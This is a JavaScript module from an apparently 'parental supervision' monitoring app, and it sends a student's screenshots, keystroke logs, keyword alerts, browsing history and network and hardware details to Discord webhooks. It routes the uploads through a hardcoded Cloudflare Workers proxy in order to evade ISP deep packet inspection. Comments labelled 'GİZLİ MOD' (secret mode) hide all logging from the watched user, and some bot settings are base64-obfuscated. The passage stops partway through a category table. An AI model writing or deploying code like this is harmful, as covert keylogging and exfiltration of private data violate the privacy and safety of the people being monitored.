// AFYONLUMMM - Discord Webhook Entegrasyonu
// Ebeveyn Gözetim Verilerini Discord'a Gönderir
const https = require('https');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const { EncryptedQueue } = require('./encrypted-queue.cjs');

// [OK] Dinamik silent-logger yolu (protected klasöründen de çalışır)
let logger;
try {
  const sameDirPath = path.join(__dirname, 'silent-logger.cjs');
  if (fs.existsSync(sameDirPath)) {
    logger = require(sameDirPath);
  } else {
    const parentDirPath = path.join(__dirname, '..', 'silent-logger.cjs');
    if (fs.existsSync(parentDirPath)) {
      logger = require(parentDirPath);
    } else {
      logger = { log: () => {}, error: () => {}, warn: () => {}, info: () => {} };
    }
  }
} catch (err) {
  logger = { log: () => {}, error: () => {}, warn: () => {}, info: () => {} };
}

class DiscordWebhookManager {
  constructor(app, configManager = null) {
    this.app = app;
    this.configManager = configManager;
    
    // Bot konfigürasyonu - Base64 encoded (obfuscation-safe)
    const b1 = Buffer.from('WUtTIEfDtnpldGltIEJvdHU=', 'base64').toString('utf8');
    const b2 = Buffer.from('aHR0cHM6Ly9pLmltZ3VyLmNvbS9BZkZwN3B1LnBuZw==', 'base64').toString('utf8');
    this.botConfig = {
      username: b1,
      avatarUrl: b2
    };
    
    // FALLBACK: Eski tek webhook URL'i yükle (backward compatibility)
    this.fallbackWebhookUrl = this.loadWebhookURL('DISCORD_WEBHOOK_URL');
    
    // ConfigManager'dan güvenli yükleme (şifrelenmiş)
    this.webhooks = {
      screenshots: this.loadWebhookURL('DISCORD_WEBHOOK_SCREENSHOTS'),
      systemStatus: this.loadWebhookURL('DISCORD_WEBHOOK_SYSTEM_STATUS'),
      activities: this.loadWebhookURL('DISCORD_WEBHOOK_ACTIVITIES'),
      alerts: this.loadWebhookURL('DISCORD_WEBHOOK_ALERTS'),
      userInfo: this.loadWebhookURL('DISCORD_WEBHOOK_USER_INFO'),
    };
    
    // Rate limiting - Discord: 50 requests/min per webhook
    this.rateLimits = {};
    this.requestQueues = {};
    
    // Encrypted persistent queue (AES-256-GCM)
    this.persistentQueue = new EncryptedQueue(app, 'discord-webhook-queue');
    
    // Retry queue (DLQ - Dead Letter Queue)
    this.retryQueue = [];
    this.maxRetries = 3;
    
    // Relay URL (ISP engellerini bypass etmek için)
    this.relayUrl = null;
    this.useRelay = false;
    
    this.initializeRateLimits();
    this.startRetryWorker();
    this.startPersistentQueueWorker();
  }
  
  // Relay sunucuyu ayarla
  setRelayUrl(url) {
    this.relayUrl = url;
    this.useRelay = !!url;
  }
  
  // Güvenli webhook URL yükleme
  loadWebhookURL(key) {
    // Önce ConfigManager'dan dene (şifrelenmiş, güvenli)
    if (this.configManager) {
      const url = this.configManager.get(key);
      if (url) {
        return url;
      }
    }
    
    // Fallback: process.env (sadece development)
    const envUrl = process.env[key];
    if (envUrl) {
      return envUrl;
    }
    
    return '';
  }
  
  // Webhook URL'yi runtime'da güncelleme
  updateWebhookURL(channel, url) {
    if (!this.webhooks.hasOwnProperty(channel)) {
      // [OK] GİZLİ MOD: Kullanıcıya log gösterme
      return false;
    }
    
    this.webhooks[channel] = url;
    
    // ConfigManager'a kaydet
    if (this.configManager) {
      const keyMap = {
        screenshots: 'DISCORD_WEBHOOK_SCREENSHOTS',
        systemStatus: 'DISCORD_WEBHOOK_SYSTEM_STATUS',
        activities: 'DISCORD_WEBHOOK_ACTIVITIES',
        alerts: 'DISCORD_WEBHOOK_ALERTS',
        userInfo: 'DISCORD_WEBHOOK_USER_INFO',
      };
      
      const key = keyMap[channel];
      if (key) {
        this.configManager.set(key, url);
      }
    }
    
    return true;
  }
  
  initializeRateLimits() {
    Object.keys(this.webhooks).forEach(channel => {
      this.rateLimits[channel] = {
        tokens: 50,
        lastRefill: Date.now(),
        maxTokens: 50,
        refillRate: 50 / 60000, // 50 tokens per minute
      };
      this.requestQueues[channel] = [];
    });
  }
  
  // Token bucket rate limiter
  canSendRequest(channel) {
    const bucket = this.rateLimits[channel];
    if (!bucket) return false;
    
    const now = Date.now();
    const timePassed = now - bucket.lastRefill;
    const tokensToAdd = timePassed * bucket.refillRate;
    
    bucket.tokens = Math.min(bucket.maxTokens, bucket.tokens + tokensToAdd);
    bucket.lastRefill = now;
    
    if (bucket.tokens >= 1) {
      bucket.tokens -= 1;
      return true;
    }
    
    return false;
  }
  
  // Screenshot Buffer gönder - CLOUDFLARE ÖNCE (Türk Telekom DPI bypass)
  async sendScreenshotBuffer(screenshotBuffer, metadata = {}) {
    const webhookUrl = this.webhooks.screenshots || this.fallbackWebhookUrl;
    if (!webhookUrl) {
      return { success: false, message: 'Webhook URL eksik' };
    }
    
    if (!this.canSendRequest('screenshots')) {
      return { success: false, message: 'Rate limit' };
    }
    
    // 1. CLOUDFLARE ÖNCE - Türk Telekom DPI bypass (en güvenilir)
    try {
      const result = await this.sendScreenshotViaCloudflare(webhookUrl, screenshotBuffer, metadata);
      if (result.success) {
        return result;
      }
    } catch (e) {
      // Cloudflare başarısız, fallback'e geç
    }
    
    // 2. FALLBACK: Direkt Discord (DPI engeli yoksa çalışır)
    try {
      const form = new FormData();
      
      const embed = {
        title: 'Yeni Ekran Goruntusu',
        description: metadata.reason || 'Otomatik screenshot',
        color: 3447003,
        fields: [
          { name: 'Zaman', value: new Date().toLocaleString('tr-TR'), inline: true },
          { name: 'Uygulama', value: metadata.activeApp || 'Bilinmiyor', inline: true },
          { name: 'Kullanici', value: metadata.userName || 'Bilinmiyor', inline: true },
        ],
        timestamp: new Date().toISOString(),
      };
      
      form.append('payload_json', JSON.stringify({ embeds: [embed], username: this.botConfig.username }));
      form.append('file', screenshotBuffer, { filename: `ss_${Date.now()}.png`, contentType: 'image/png' });
      
      // Buffer'ı da geçir - fallback için kullanılacak
      const result = await this.sendFormData(webhookUrl, form, screenshotBuffer, metadata);
      return result;
    } catch (error) {
      return { success: false, message: error.message };
    }
  }

  // Ekran görüntüsünü Discord'a gönder (dosya olarak - ESKİ YOL, sadece clipboard için kullanılıyor)
  async sendScreenshot(screenshotPath, metadata = {}) {
    // [OK] FALLBACK: Önce kanal URL'ini dene, yoksa fallback'e düş
    const webhookUrl = this.webhooks.screenshots || this.fallbackWebhookUrl;
    if (!webhookUrl) {
      // [OK] GİZLİ MOD: Kullanıcıya log gösterme
      return { success: false, message: 'Webhook URL eksik' };
    }
    
    if (!this.canSendRequest('screenshots')) {
      // Rate limit aşıldı, kuyruğa ekle
      this.requestQueues.screenshots.push({ type: 'screenshot', screenshotPath, metadata });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      const form = new FormData();
      
      // Embed mesajı
      const embed = {
        title: '📸 Yeni Ekran Görüntüsü',
        description: metadata.reason || 'Otomatik periyodik screenshot',
        color: 3447003, // Mavi
        fields: [
          {
            name: '⏰ Zaman',
            value: new Date().toLocaleString('tr-TR'),
            inline: true,
          },
          {
            name: '[DESKTOP] Aktif Uygulama',
            value: metadata.activeApp || 'Bilinmiyor',
            inline: true,
          },
          {
            name: '👤 Kullanıcı',
            value: metadata.userName || 'Bilinmiyor',
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: 'YKS Takip Sistemi - Ebeveyn Gözetim',
        },
      };
      
      const payload = {
        embeds: [embed],
        username: this.botConfig.username,
        avatar_url: this.botConfig.avatarUrl,
      };
      
      form.append('payload_json', JSON.stringify(payload));
      
      // Screenshot dosyasını ekle
      if (fs.existsSync(screenshotPath)) {
        form.append('file', fs.createReadStream(screenshotPath), {
          filename: `screenshot_${Date.now()}.png`,
        });
      }
      
      const result = await this.sendFormData(webhookUrl, form);
      
      // [OK] DÜZELTME: Discord'a başarıyla gönderildiyse dosyayı sil
      if (result.success && fs.existsSync(screenshotPath)) {
        try {
          fs.unlinkSync(screenshotPath);
          // [OK] GİZLİ MOD: Kullanıcıya log gösterme
        } catch (unlinkError) {
          // [OK] GİZLİ MOD: Kullanıcıya log gösterme
        }
      }
      
      return result;
    } catch (error) {
      // [OK] GİZLİ MOD: Kullanıcıya log gösterme
      this.addToRetryQueue('screenshots', { type: 'screenshot', screenshotPath, metadata });
      return { success: false, message: error.message };
    }
  }
  
  // ========================================================================
  // [DESKTOP] GELİŞMİŞ SİSTEM DURUMU - v2.0
  // Tam doğrulukta WiFi, VPN, Mikrofon algılama
  // ========================================================================
  
  async sendSystemStatus(statusData) {
    const webhookUrl = this.webhooks.systemStatus || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('systemStatus')) {
      this.requestQueues.systemStatus = this.requestQueues.systemStatus || [];
      this.requestQueues.systemStatus.push({ type: 'systemStatus', statusData });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      // ========================================
      // [OK] GELİŞMİŞ WiFi Durumu - Detaylı bilgiler
      // ========================================
      const isWifiConnected = statusData.wifiConnected === true;
      const isEthernet = statusData.wifiIsEthernet === true;
      
      let wifiDisplay = '';
      let wifiIcon = '[OK]';
      
      if (isWifiConnected) {
        const ssid = statusData.wifiSSID || 'Bilinmiyor';
        const signal = statusData.wifiSignal || null;
        const channel = statusData.wifiChannel || null;
        const speed = statusData.wifiSpeed || null;
        const auth = statusData.wifiAuth || null;
        const bssid = statusData.wifiBSSID || null;
        
        // WiFi adını göster
        wifiDisplay = `**${ssid}**`;
        
        // Ethernet mi WiFi mi belirle
        if (isEthernet) {
          wifiIcon = '🔌';
          wifiDisplay = '**Kablolu Bağlantı** (Ethernet)';
        } else {
          wifiIcon = '📶';
        }
        
        // Detayları alt satırda göster
        const details = [];
        if (signal && signal !== 'N/A') {
          // Sinyal gücüne göre emoji
          const signalNum = parseInt(signal);
          let signalEmoji = '📶';
          if (signalNum >= 80) signalEmoji = '📶';
          else if (signalNum >= 60) signalEmoji = '📶';
          else if (signalNum >= 40) signalEmoji = '📶';
          else signalEmoji = '📵';
          details.push(`${signalEmoji} ${signal}`);
        }
        if (channel && channel !== 'N/A') details.push(`Kanal: ${channel}`);
        if (speed && speed !== 'N/A') details.push(`${speed}`);
        if (auth && auth !== 'N/A') details.push(`🔐 ${auth}`);
        
        if (details.length > 0 && !isEthernet) {
          wifiDisplay += `\n*${details.join(' • ')}*`;
        }
        
        // BSSID (Access Point MAC) - opsiyonel
        if (bssid && !isEthernet) {
          wifiDisplay += `\nAP: \`${bssid}\``;
        }
      } else {
        wifiDisplay = '[X] Bağlı Değil';
        wifiIcon = '[X]';
      }
      
      // ========================================
      // [OK] GELİŞMİŞ VPN Durumu - Detaylı tespit
      // ========================================
      const vpnDetected = statusData.vpnDetected === true;
      const vpnDetails = statusData.vpnDetails || {};
      
      let vpnDisplay = '';
      if (vpnDetected) {
        vpnDisplay = '**VPN Tespit Edildi!**';
        if (vpnDetails.name) {
          vpnDisplay += `\n*Tespit: ${vpnDetails.name}*`;
        }
        if (vpnDetails.type) {
          const typeNames = {
            'adapter': 'Ağ Adaptörü',
            'routing': 'Yönlendirme Tablosu',
            'ras': 'RAS/PPP Bağlantısı',
            'process': 'VPN Uygulaması'
          };
          vpnDisplay += `\n*Yöntem: ${typeNames[vpnDetails.type] || vpnDetails.type}*`;
        }
      } else {
        vpnDisplay = 'VPN Yok ✓';
      }
      
      // ========================================
      // [OK] GELİŞMİŞ Mikrofon Durumu - Uygulama bilgisi
      // ========================================
      const micActive = statusData.microphoneActive === true;
      const micDetails = statusData.microphoneDetails || {};
      
      let micDisplay = '';
      if (micActive) {
        micDisplay = '**Aktif - Kullanılıyor**';
        if (micDetails.app) {
          micDisplay += `\n*Uygulama: ${micDetails.app}*`;
        }
      } else {
        micDisplay = 'İnaktif';
      }
      
      // ========================================
      // İşletim Sistemi Bilgisi
      // ========================================
      let archDisplay = statusData.arch === 'x64' ? '64-bit' : (statusData.arch === 'x86' ? '32-bit' : statusData.arch || 'Bilinmiyor');
      const osDisplay = `${statusData.platform || 'Bilinmiyor'} (${archDisplay})`;
      
      // ========================================
      // Embed oluştur
      // ========================================
      const embed = {
        title: '[DESKTOP] Sistem Durumu Raporu',
        description: `**${statusData.hostname || 'Bilinmiyor'}** bilgisayarının güncel durumu`,
        color: vpnDetected ? 0xEF4444 : (isWifiConnected ? 0x22C55E : 0xF59E0B),
        fields: [
          // Sistem Bilgileri
          { name: '[PC] İşletim Sistemi', value: osDisplay, inline: true },
          { name: '[DESKTOP] Bilgisayar Adı', value: statusData.hostname || 'Bilinmiyor', inline: true },
          { name: '⏱️ Sistem Uptime', value: statusData.uptime || 'Bilinmiyor', inline: true },
          
          // Donanım Bilgileri
          { name: '🧠 CPU', value: this.sanitizeTurkishText(statusData.cpu, 100) || 'Bilinmiyor', inline: true },
          { name: '💾 RAM Kullanımı', value: `${statusData.memoryUsage || 0}%`, inline: true },
          { name: '[CHART] RAM Detay', value: statusData.ramDetail || 'Bilinmiyor', inline: true },
          
          // Network Bilgileri
          { name: '[WEB] MAC Adresi', value: `\`${statusData.macAddress || 'Bilinmiyor'}\``, inline: true },
          { name: '📡 Yerel IP', value: `\`${statusData.localIP || 'Bilinmiyor'}\``, inline: true },
          { name: '🌍 Public IP', value: `\`${statusData.publicIP || 'Bilinmiyor'}\``, inline: true },
          
          // Bağlantı Durumları - Gelişmiş gösterim
          { 
            name: `${wifiIcon} WiFi Durumu`, 
            value: wifiDisplay, 
            inline: false 
          },
          { 
            name: `${vpnDetected ? '[!]' : '[OK]'} VPN Durumu`, 
            value: vpnDisplay, 
            inline: true 
          },
          { 
            name: `${micActive ? '🔴' : '⚪'} Mikrofon`, 
            value: micDisplay, 
            inline: true 
          },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'Afyonlum Sistem İzleme' },
      };
      
      // ========================================
      // AFK Durumu (varsa)
      // ========================================
      if (statusData.isAFK !== undefined) {
        const afkMinutes = statusData.afkDurationMinutes || 0;
        const isLongAFK = afkMinutes >= 15;
        
        embed.fields.push({
          name: `${statusData.isAFK ? '[PAUSE]' : '[OK]'} AFK Durumu`,
          value: statusData.isAFK 
            ? `**UZAKTA** (${afkMinutes} dakika)${isLongAFK ? '\n[!] 15+ dakika aktivite yok!' : ''}`
            : `Aktif (son aktivite: ${afkMinutes} dakika önce)`,
          inline: false,
        });
      }
      
      // ========================================
      // Önemli uyarılar
      // ========================================
      const warnings = [];
      if (vpnDetected) warnings.push('VPN kullanımı tespit edildi');
      if (statusData.incognitoDetected) warnings.push('Gizli sekme kullanımı tespit edildi');
      if (statusData.isLongAFK) warnings.push('15+ dakikadan fazla aktivite yok');
      
      if (warnings.length > 0) {
        embed.fields.push({
          name: '[!] Uyarılar',
          value: warnings.map(w => `• ${w}`).join('\n'),
          inline: false,
        });
      }
      
      const payload = {
        content: vpnDetected ? '[!] **VPN KULLANIMI TESPİT EDİLDİ!**' : undefined,
        embeds: [embed],
        username: 'Afyonlum Sistem Botu',
        avatar_url: this.botConfig.avatarUrl,
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      this.addToRetryQueue('systemStatus', { type: 'systemStatus', statusData });
      return { success: false, message: error.message };
    }
  }
  
  // Kullanıcı aktivitesi gönder
  async sendActivity(activityData) {
    // [OK] FALLBACK: Önce kanal URL'ini dene, yoksa fallback'e düş
    const webhookUrl = this.webhooks.activities || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('activities')) {
      this.requestQueues.activities.push({ type: 'activity', activityData });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      // [OK] DÜZELTME: Aktivite tipine göre renk ve emoji
      const activityColors = {
        'task': 0x10b981, // Yeşil - Görevler
        'question': 0x6366f1, // Mor - Soru kayıtları
        'exam': 0xf59e0b, // Turuncu - Denemeler
        'study': 0x3b82f6, // Mavi - Çalışma saatleri
        'flashcard': 0xec4899, // Pembe - Flashcard'lar
        'goal': 0x8b5cf6, // Mor - Hedefler
        'system': 0x6b7280, // Gri - Sistem
        'default': 15844367 // Varsayılan turuncu
      };
      
      const activityIcons = {
        'task': '[OK]',
        'question': '[MEMO]',
        'exam': '[CHART]',
        'study': '⏰',
        'flashcard': '🎴',
        'goal': '🎯',
        'system': '⚙️',
        'default': '[PHONE]'
      };
      
      const activityType = activityData.type || 'default';
      const color = activityColors[activityType] || activityColors.default;
      const icon = activityIcons[activityType] || activityIcons.default;
      
      const embed = {
        title: `${icon} ${activityData.action || 'Kullanıcı Aktivitesi'}`,
        description: activityData.description || '',
        color: color,
        fields: [
          {
            name: '🕐 Zaman',
            value: activityData.timestamp || new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
            inline: true,
          },
          {
            name: '[PHONE] Tip',
            value: activityType === 'default' ? 'Genel' : activityType.charAt(0).toUpperCase() + activityType.slice(1),
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
      };
      
      // Detaylar varsa ekle
      if (activityData.details && typeof activityData.details === 'object') {
        const detailsText = Object.entries(activityData.details)
          .map(([key, value]) => `**${key}**: ${value}`)
          .join('\n')
          .substring(0, 1000);
        
        if (detailsText) {
          embed.fields.push({
            name: '📋 Detaylar',
            value: detailsText,
            inline: false,
          });
        }
      }
      
      // URL varsa ekle
      if (activityData.url) {
        embed.fields.push({
          name: '[WEB] URL',
          value: activityData.url.substring(0, 100),
          inline: false,
        });
      }
      
      // Uygulama varsa ekle
      if (activityData.application) {
        embed.fields.push({
          name: '[PC] Uygulama',
          value: activityData.application,
          inline: true,
        });
      }
      
      const payload = {
        embeds: [embed],
        username: 'YKS Aktivite Takip',
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      this.addToRetryQueue('activities', { type: 'activity', activityData });
      return { success: false, message: error.message };
    }
  }
  
  // [OK] YENİ: Dosya ile aktivite gönder (keystroke özeti için) - CLOUDFLARE ÖNCE
  async sendActivityWithFile(activityData, fileContent, fileName) {
    const webhookUrl = this.webhooks.activities || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('activities')) {
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    // Embed oluştur
    const embed = {
      title: `[KEYBOARD] ${activityData.action || 'Klavye Aktivite Ozeti'}`,
      description: activityData.description || '',
      color: 0x3b82f6,
      fields: [
        {
          name: 'Zaman',
          value: activityData.timestamp || new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
          inline: true,
        },
        {
          name: 'Ozet',
          value: activityData.summary || 'Detaylar dosyada',
          inline: true,
        },
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: 'Klavye Izleme - Detayli log dosyada',
      },
    };
    
    // Uyarılar varsa ekle
    if (activityData.alerts) {
      embed.fields.push({
        name: 'Anahtar Kelime Tespitleri',
        value: activityData.alerts.substring(0, 500),
        inline: false,
      });
    }
    
    // 1. CLOUDFLARE ÖNCE - Türk Telekom DPI bypass (dosya için base64)
    try {
      const fileBuffer = Buffer.from(fileContent, 'utf-8');
      const result = await this.sendFileViaCloudflare(webhookUrl, fileBuffer, fileName, embed);
      if (result.success) {
        return result;
      }
    } catch (e) {
      // Cloudflare başarısız, fallback'e geç
    }
    
    // 2. FALLBACK: Direkt Discord (DPI engeli yoksa çalışır)
    try {
      const form = new FormData();
      const payload = {
        embeds: [embed],
        username: 'YKS Klavye Izleme',
      };
      
      form.append('payload_json', JSON.stringify(payload));
      
      // .txt dosyasını ekle - UTF-8 encoding ile Türkçe karakterler korunur
      const fileBuffer = Buffer.from(fileContent, 'utf-8');
      form.append('file', fileBuffer, {
        filename: fileName || 'keystroke_log.txt',
        contentType: 'text/plain; charset=utf-8',
      });
      
      return await this.sendFormData(webhookUrl, form);
    } catch (error) {
      return { success: false, message: error.message };
    }
  }
  
  // [OK] YENİ: Dosyayı Cloudflare proxy üzerinden gönder (TXT dosyalar için)
  async sendFileViaCloudflare(webhookUrl, fileBuffer, fileName, embed) {
    const CLOUDFLARE_PROXY = 'https://berattt3.beratkaccow03.workers.dev';
    
    return new Promise((resolve, reject) => {
      try {
        const proxyUrl = `${CLOUDFLARE_PROXY}?target=${encodeURIComponent(webhookUrl)}&type=file`;
        const parsedUrl = new URL(proxyUrl);
        
        // Dosyayı base64 olarak gönder
        const base64File = fileBuffer.toString('base64');
        
        const payload = {
          embeds: embed ? [embed] : [],
          username: 'YKS Klavye Izleme',
          attachments: [{
            id: 0,
            filename: fileName || 'keystroke_log.txt',
            data: base64File,
            contentType: 'text/plain; charset=utf-8'
          }]
        };
        
        const jsonPayload = JSON.stringify(payload);
        const payloadBuffer = Buffer.from(jsonPayload, 'utf-8');
        
        const options = {
          hostname: parsedUrl.hostname,
          port: 443,
          path: parsedUrl.pathname + parsedUrl.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': payloadBuffer.length,
          },
          timeout: 10000, // 10 saniye - dosya için daha uzun süre
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({ success: true, statusCode: res.statusCode, via: 'cloudflare' });
            } else {
              reject(new Error(`Cloudflare HTTP ${res.statusCode}`));
            }
          });
        });
        
        req.on('timeout', () => { req.destroy(); reject(new Error('Cloudflare timeout')); });
        req.on('error', (error) => { reject(error); });
        req.write(payloadBuffer);
        req.end();
      } catch (error) {
        reject(error);
      }
    });
  }
  
  // ========================================================================
  // 🔧 GELİŞMİŞ TÜRKÇE KARAKTER DESTEĞİ - v2.0
  // Tüm Türkçe karakterler (ı, ğ, ü, ş, ö, ç, İ, Ğ, Ü, Ş, Ö, Ç) ve 
  // semboller (! ? - . , : ; ' " @ # $ % ^ & * ( ) [ ] { } < > / \ | ~) desteklenir
  // ========================================================================
  
  // [OK] GLOBAL: Gelişmiş Türkçe karakter temizleme fonksiyonu
  sanitizeTurkishText(text, maxLength = 1024) {
    if (!text) return '';
    
    try {
      let result = String(text);
      
      // 1. Unicode NFC normalization (Türkçe karakterler için kritik)
      result = result.normalize('NFC');
      
      // 2. Sadece zararlı kontrol karakterlerini temizle (Türkçe/semboller korunur)
      // ASCII kontrol karakterleri (0x00-0x1F) ve DEL (0x7F) - bunlar görüntülenemez
      // 0x80-0xFF aralığı Türkçe karakterler içerir, bunlara DOKUNMA
      result = result.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
      
      // 3. Discord embed için geçersiz karakterleri temizle
      // Sadece gerçekten sorun yaratanları kaldır
      result = result.replace(/[\uFFFD\uFFFE\uFFFF]/g, ''); // Replacement/noncharacter
      
      // 4. Çoklu boşlukları tek boşluğa indir (ama satır sonlarını koru)
      result = result.replace(/[^\S\n]+/g, ' ');
      
      // 5. Maksimum uzunluk kontrolü
      if (result.length > maxLength) {
        result = result.substring(0, maxLength - 3) + '...';
      }
      
      return result.trim();
    } catch (err) {
      // Hata durumunda orijinal metni döndür (en azından bir şey göster)
      return String(text).substring(0, maxLength).trim();
    }
  }
  
  // Uyarı gönder (Keyword, VPN, Incognito vb.) - [OK] v2.0: TAM TÜRKÇE KARAKTER DESTEĞİ
  async sendAlert(alertData) {
    const webhookUrl = this.webhooks.alerts || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    if (!this.canSendRequest('alerts')) {
      this.requestQueues.alerts = this.requestQueues.alerts || [];
      this.requestQueues.alerts.push({ type: 'alert', alertData });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      const severityColors = {
        low: 0x22C55E,     // Yeşil
        medium: 0xF59E0B,   // Turuncu
        high: 0xEF4444,     // Kırmızı
        critical: 0x991B1B  // Koyu Kırmızı
      };
      
      const severityLabels = {
        low: 'DÜŞÜK SEVİYE',
        medium: 'ORTA SEVİYE',
        high: 'YÜKSEK SEVİYE',
        critical: 'KRİTİK SEVİYE'
      };
      const severityLabel = severityLabels[alertData.severity] || 'UYARI';
      
      // [OK] Tüm metinleri güvenli hale getir
      const safeMessage = this.sanitizeTurkishText(alertData.message, 2000) || 'Uyarı detayı yok';
      const safeType = this.sanitizeTurkishText(alertData.type, 256) || 'Bilinmiyor';
      
      const embed = {
        title: `🚨 ${severityLabel}`,
        description: safeMessage,
        color: severityColors[alertData.severity] || 0xF59E0B,
        fields: [
          {
            name: '[!] Uyarı Türü',
            value: safeType,
            inline: true,
          },
          {
            name: '🕐 Zaman',
            value: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: 'Afyonlum Uyarı Sistemi',
        },
      };
      
      // [OK] GELİŞTİRİLMİŞ: Detayları doğru formatta ekle
      if (alertData.details && typeof alertData.details === 'object') {
        for (const [key, value] of Object.entries(alertData.details)) {
          const safeKey = this.sanitizeTurkishText(key, 256);
          const safeValue = this.sanitizeTurkishText(String(value), 1024);
          
          if (safeKey && safeValue) {
            // "Son 50 Kelime/Cümle" için özel alan (daha uzun)
            const isLongContent = key.includes('Son 50') || key.includes('Kelime') || key.includes('Cümle');
            
            embed.fields.push({
              name: safeKey,
              value: isLongContent ? `\`\`\`\n${safeValue}\n\`\`\`` : safeValue,
              inline: !isLongContent,
            });
          }
        }
      }
      
      // [OK] Uyarı kaynağı varsa ekle
      if (alertData.source) {
        embed.fields.push({
          name: '📍 Kaynak',
          value: this.sanitizeTurkishText(alertData.source, 256),
          inline: true,
        });
      }
      
      // [OK] Uygulama bilgisi varsa ekle
      if (alertData.application) {
        embed.fields.push({
          name: '[PC] Uygulama',
          value: this.sanitizeTurkishText(alertData.application, 256),
          inline: true,
        });
      }
      
      const payload = {
        content: alertData.severity === 'critical' ? '@everyone' : undefined,
        embeds: [embed],
        username: 'Afyonlum Uyarı Sistemi',
        avatar_url: this.botConfig.avatarUrl,
      };
      
      return await this.sendJSON(webhookUrl, payload);
    } catch (error) {
      this.addToRetryQueue('alerts', { type: 'alert', alertData });
      return { success: false, message: error.message };
    }
  }
  
  // ========================================================================
  // [WEB] GELİŞMİŞ WEB TRAFİK İZLEME - v2.0
  // Chrome geçmişi + son 10 site + tam detaylı bilgi
  // ========================================================================
  
  // Son ziyaret edilen siteleri sakla (son 10 site için)
  _recentSites = [];
  
  async sendWebTraffic(trafficData) {
    const webhookUrl = this.webhooks.webTraffic || this.fallbackWebhookUrl;
    if (!webhookUrl) return { success: false, message: 'Webhook URL eksik' };
    
    // Rate limit kontrolü
    if (!this.canSendRequest('webTraffic')) {
      this.requestQueues.webTraffic = this.requestQueues.webTraffic || [];
      this.requestQueues.webTraffic.push({ type: 'webTraffic', trafficData });
      return { success: false, message: 'Rate limit - kuyrukta bekliyor' };
    }
    
    try {
      // [OK] Son 6 siteyi sakla (1 mevcut + 5 önceki = 6 site)
      this._recentSites.unshift({
        domain: trafficData.domain,
        title: this.sanitizeTurkishText(trafficData.title, 100) || '(Başlık yok)',
        url: trafficData.url,
        timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
        source: trafficData.source || 'unknown'
      });
      if (this._recentSites.length > 6) {
        this._recentSites = this._recentSites.slice(0, 6);
      }
      
      // [OK] Site kategorisi belirle
      const categorizeWebsite = (domain) => {
        const categories = {
          'sosyal_medya': ['facebook', 'twitter', 'instagram', 'tiktok', 'snapchat', 'reddit', 'whatsapp', 'telegram', 'discord', 'x.com'],
          'video': ['youtube', 'twitch', 'vimeo', 'dailymotion', 'netflix', 'primevideo', 'disneyplus', 'hulu'],
          'cinsel': ['porn', 'xxx', 'xvideos', 'xnxx', 'xhamster', 'pornhub', 'redtube', 'youporn', 'tube8', 'spankbang', 'brazzers', 'onlyfans', 'chaturbate', 'stripchat', 'livejasmin', 'cam4', 'bongacams', 'adult', 'nsfw', 'hentai', 'rule34', 'nhentai', 'hanime', 'eporner', 'ixxx', 'beeg', 'tnaflix', 'drtuber', 'nudevista', 'fuq', 'thumbzilla', 'youjizz', 'txxx', 'motherless', 'fapster', 'jav', 'javhd', 'brazzers', 'realitykings', 'naughtyamerica', 'bangbros', 'mofos', 'blacked', 'tushy', 'vixen', 'deeper', 'slayed'],
          'egitim': ['khan', 'coursera', 'udemy', 'edx', 'eba', 'vitamin', 'morpa', 'yks', 'osym', 'wikipedia', 'britannica'],
          'alisveris': ['amazon', 'trendyol', 'hepsiburada', 'n11', 'ebay', 'aliexpress', 'gittigidiyor'],
          'haber': ['bbc', 'cnn', 'hurriyet', 'sabah', 'sozcu', 'milliyet', 'haberturk', 'ntv', 'reuters'],
          'arama': ['google', 'bing', 'yahoo', 'yandex', 'duckduckgo', 'baidu'],
          'soru_cevap': ['eksisozluk', 'stackoverflow', 'quora', 'reddit', 'stackexchange'],
          'muzik': ['spotify', 'youtube.music', 'applemusic', 'soundcloud', 'deezer'],
        };
        
        for (const [cat, keywords] of Object.entries(categories)) {
          if (keywords.some(kw => domain.toLowerCase().includes(kw))) {
            return cat;
          }
        }
        return 'diger';
      };
      
      const category = categorizeWebsite(trafficData.domain);
      
      // Kategoriye göre emoji ve renk
      const categoryInfo = {
        'sosyal_medya': { emoji: '💬', color: 0x1DA1F2, label: 'Sosyal Medya' },
        'video': { emoji: '🎥', color: 0xFF0000, label: 'Video Platformu' },
        'cinsel': { emoji: '🔞', color: 0xDC2626, label: 'Cinsel Icerik' },
        'egitim': { emoji: '📚', color: 0x10B981, label: 'Eğitim' },
        'alisveris': { emoji: '🛒', color: 0xF59E0B, label: 'Alışveriş' },
        'haber': { emoji: '📰', color: 0x6B7280, label: 'Haber' },
        'arama': { emoji: '[SEARCH]', color: 0x4285F4, label: 'Arama Motoru' },
